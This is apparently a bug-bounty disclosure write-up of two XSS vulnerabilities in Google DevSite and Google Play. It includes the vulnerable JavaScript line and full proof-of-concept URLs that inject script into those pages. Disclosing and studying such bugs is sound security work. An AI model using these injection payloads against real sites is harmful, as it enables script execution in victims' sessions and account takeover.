---
title: Google XSS
---

# Google DevSite XSS (cloud.google.com, developers.google.com) $3133.70
Due to a vulnerability in the server-side implementation of ```<devsite-language-selector>``` part of the URL was reflected as html so it was possible to get XSS on the origins using that component from the 404 page.  
This was found using [DalFox](https://dalfox.hahwul.com/docs/home/) which kept finding the same bug due to it being the "not found" page.  

https://developers.google.com/foo%22%3E%3Cimg%20src=x%3E%3C/a%3E%3C/li%3E%3C/ul%3E%3C/devsite-language-selector%3E%3Ch1%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/a
https://cloud.google.com/foo%22%3E%3Cimg%20src=x%3E%3C/a%3E%3C/li%3E%3C/ul%3E%3C/devsite-language-selector%3E%3Ch1%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/a
  
# Google Play XSS (play.google.com)  $5000
On the search page of the google play console vulnerable code was run when the search resulted in an error.  
Getting an error was simple as doing ```/?search=&``` and because ```window.location``` includes the hash which never encodes ```'``` it’s possible to escape the href context and set other html attributes, unlike the DevSite XSS this is prevented by the CSP but was still awarded more by the panel.  
```js
b.innerHTML = b.innerHTML.replace(/({query})/g, "<a href='" + window.location + "'>" + a.g + "</a>");
```
https://play.google.com/console/about/search-results/?search=&#'onclick=alert(document.domain)//

The writeups are referenced on [PortSwigger](https://portswigger.net/daily-swig/xss-vulnerabilities-in-google-cloud-google-play-could-lead-to-account-hijacks)
